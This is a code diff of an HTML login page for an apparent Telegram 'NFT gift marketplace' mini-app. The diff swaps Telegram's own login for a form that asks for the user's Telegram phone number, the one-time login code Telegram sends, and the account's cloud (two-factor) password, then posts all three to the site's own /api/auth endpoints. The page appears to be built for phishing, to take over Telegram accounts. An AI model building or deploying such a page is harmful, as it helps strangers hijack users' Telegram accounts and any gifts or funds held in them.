@@ -5,88 +5,360 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NFT Marketplace - Авторизация</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .auth-card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 60px;
+            margin-bottom: 10px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            background: #007bff;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover {
+            background: #0056b3;
+            transform: translateY(-2px);
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+        }
+        
+        .btn-secondary:hover {
+            background: #545b62;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        
+        .info-text {
+            background: #e7f3ff;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #0066cc;
+        }
+        
+        .code-display {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-size: 24px;
+            font-weight: bold;
+            color: #28a745;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e9ecef;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 10px;
+            font-weight: bold;
+            color: #6c757d;
+        }
+        
+        .step.active {
+            background: #007bff;
+            color: white;
+        }
+        
+        .user-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="auth-card">
-            <!-- Логотип и заголовок -->
             <div class="logo">🎁</div>
             <h1>NFT Маркетплейс</h1>
-            <p class="subtitle">Цифровые подарки для Telegram</p>
+            <p class="subtitle">Авторизация через Telegram</p>
             
-            <!-- Индикатор загрузки -->
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Подключаемся к Telegram...</p>
+            <!-- Step Indicator -->
+            <div class="step-indicator">
+                <div class="step active" id="step1">1</div>
+                <div class="step" id="step2">2</div>
+                <div class="step" id="step3">3</div>
             </div>
             
-            <!-- Контент авторизации -->
-            <div id="authContent" class="hidden">
-                <div class="features">
-                    <div class="feature">
-                        <span class="feature-icon">🔐</span>
-                        <span class="feature-text">Безопасная авторизация через Telegram</span>
-                    </div>
-                    <div class="feature">
-                        <span class="feature-icon">🛍️</span>
-                        <span class="feature-text">Уникальные NFT подарки и стикеры</span>
-                    </div>
-                    <div class="feature">
-                        <span class="feature-icon">💝</span>
-                        <span class="feature-text">Легко дарить друзьям и близким</span>
-                    </div>
-                    <div class="feature">
-                        <span class="feature-icon">🚀</span>
-                        <span class="feature-text">Мгновенные покупки и переводы</span>
-                    </div>
+            <!-- Step 1: Phone Input -->
+            <div id="stepPhone" class="auth-step">
+                <div class="form-group">
+                    <label class="form-label">Номер телефона Telegram</label>
+                    <input type="tel" id="phoneInput" class="form-input" 
+                           placeholder="+79123456789" required>
                 </div>
-                
-                <button class="btn btn-primary" onclick="loginWithTelegram()">
-                    <span class="btn-icon">🔐</span>
-                    Войти через Telegram
-                </button>
-                
-                <div class="privacy-notice">
-                    <p class="privacy-text">
-                        Нажимая кнопку, вы соглашаетесь с нашей 
-                        <a href="#" class="privacy-link">Политикой конфиденциальности</a>
-                        и
-                        <a href="#" class="privacy-link">Условиями использования</a>
-                    </p>
-                </div>
+                <button class="btn" onclick="requestCode()">Получить код</button>
             </div>
             
-            <!-- Информация о пользователе -->
-            <div id="userInfo" class="user-info hidden">
-                <div class="user-avatar">👤</div>
-                <h3>Добро пожаловать!</h3>
-                <p id="userName" class="user-name">Пользователь</p>
-                <p class="user-status">✅ Авторизация успешна</p>
-                <button class="btn btn-success" onclick="enterMarketplace()">
-                    <span class="btn-icon">🛍️</span>
-                    Войти в маркетплейс
-                </button>
+            <!-- Step 2: Code Verification -->
+            <div id="stepCode" class="auth-step hidden">
+                <div class="info-text">
+                    📱 Код отправлен в ваш Telegram аккаунт
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Код подтверждения</label>
+                    <input type="text" id="codeInput" class="form-input" 
+                           placeholder="1234" maxlength="4" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Облачный пароль (если есть)</label>
+                    <input type="password" id="cloudPasswordInput" class="form-input" 
+                           placeholder="Необязательно">
+                </div>
+                <button class="btn" onclick="verifyCode()">Продолжить</button>
+                <button class="btn btn-secondary" onclick="backToPhone()">Назад</button>
             </div>
-
-            <!-- Сообщение об ошибке -->
-            <div id="errorMessage" class="error-message hidden">
-                <div class="error-icon">⚠️</div>
-                <h3>Ошибка авторизации</h3>
-                <p id="errorText">Не удалось выполнить авторизацию</p>
-                <button class="btn btn-secondary" onclick="retryAuth()">
-                    <span class="btn-icon">🔄</span>
-                    Попробовать снова
-                </button>
+            
+            <!-- Step 3: Success -->
+            <div id="stepSuccess" class="auth-step hidden">
+                <div class="user-info">
+                    <h3>✅ Авторизация успешна!</h3>
+                    <p id="userPhone"></p>
+                </div>
+                <button class="btn" onclick="enterMarketplace()">Войти в маркетплейс</button>
+            </div>
+            
+            <!-- Demo Code Display -->
+            <div id="demoCode" class="code-display hidden">
+                Демо код: <span id="demoCodeValue"></span>
             </div>
         </div>
-
-        <!-- Футер -->
-        <footer class="footer">
-            <p>© 2024 NFT Маркетплейс. Все права защищены.</p>
-        </footer>
     </div>
-    
-    <script src="auth.js"></script>
+
+    <script>
+        let currentSessionId = null;
+        let currentPhone = null;
+        
+        // Update step indicator
+        function updateStepIndicator(step) {
+            document.querySelectorAll('.step').forEach((s, index) => {
+                if (index + 1 <= step) {
+                    s.classList.add('active');
+                } else {
+                    s.classList.remove('active');
+                }
+            });
+        }
+        
+        // Show specific step
+        function showStep(stepName) {
+            document.querySelectorAll('.auth-step').forEach(step => {
+                step.classList.add('hidden');
+            });
+            document.getElementById(`step${stepName}`).classList.remove('hidden');
+        }
+        
+        // Step 1: Request verification code
+        async function requestCode() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            
+            if (!phone) {
+                alert('Введите номер телефона');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/auth/request-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentPhone = phone;
+                    updateStepIndicator(2);
+                    showStep('Code');
+                    
+                    // Show demo code (remove in production)
+                    document.getElementById('demoCodeValue').textContent = data.code;
+                    document.getElementById('demoCode').classList.remove('hidden');
+                } else {
+                    alert('Ошибка: ' + data.error);
+                }
+            } catch (error) {
+                alert('Ошибка соединения: ' + error.message);
+            }
+        }
+        
+        // Step 2: Verify code
+        async function verifyCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            const cloudPassword = document.getElementById('cloudPasswordInput').value;
+            
+            if (!code) {
+                alert('Введите код подтверждения');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/auth/verify-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        phone: currentPhone,
+                        code: code,
+                        cloudPassword: cloudPassword 
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentSessionId = data.sessionId;
+                    updateStepIndicator(3);
+                    showStep('Success');
+                    document.getElementById('userPhone').textContent = `Телефон: ${currentPhone}`;
+                    document.getElementById('demoCode').classList.add('hidden');
+                } else {
+                    alert('Ошибка: ' + data.error);
+                }
+            } catch (error) {
+                alert('Ошибка соединения: ' + error.message);
+            }
+        }
+        
+        // Back to phone step
+        function backToPhone() {
+            updateStepIndicator(1);
+            showStep('Phone');
+            document.getElementById('demoCode').classList.add('hidden');
+        }
+        
+        // Enter marketplace
+        function enterMarketplace() {
+            if (currentSessionId) {
+                localStorage.setItem('nft_session', currentSessionId);
+                window.location.href = '/marketplace';
+            } else {
+                alert('Сессия не найдена');
+            }
+        }
+        
+        // Check existing session on page load
+        async function checkExistingSession() {
+            const savedSession = localStorage.getItem('nft_session');
+            if (savedSession) {
+                try {
+                    const response = await fetch(`/api/auth/verify-session?sessionId=${savedSession}`);
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        currentSessionId = savedSession;
+                        currentPhone = data.user.phone;
+                        updateStepIndicator(3);
+                        showStep('Success');
+                        document.getElementById('userPhone').textContent = `Телефон: ${currentPhone}`;
+                    } else {
+                        localStorage.removeItem('nft_session');
+                    }
+                } catch (error) {
+                    localStorage.removeItem('nft_session');
+                }
+            }
+        }
+        
+        // Initialize
+        checkExistingSession();
+    </script>
 </body>
 </html>
